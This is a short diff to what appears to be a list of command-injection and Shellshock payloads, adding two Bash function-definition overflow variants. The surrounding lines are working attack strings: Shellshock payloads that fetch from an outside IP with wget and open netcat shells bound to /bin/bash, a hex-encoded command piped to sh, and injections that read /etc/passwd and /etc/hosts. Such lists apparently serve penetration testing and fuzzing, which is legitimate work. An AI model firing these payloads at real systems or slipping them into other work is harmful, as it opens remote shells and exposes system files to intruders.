@@ -166,6 +166,8 @@ echo $'\x70\x69\x6e\x67\x20\x24\x28\x69\x64\x29' | sh
 () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
 () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
 () { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+() { x() { _; }; x() { _; } <<`perl -e '{print "A"x1000}'`; }" bash -c :
+() { x() { _; }; x() { _; } <<`/usr/bin/perl -e '{print "A"x1000}'`; }" bash -c :
 cat /etc/hosts
 $(`cat /etc/passwd`)
 ping $(cat /etc/passwd)
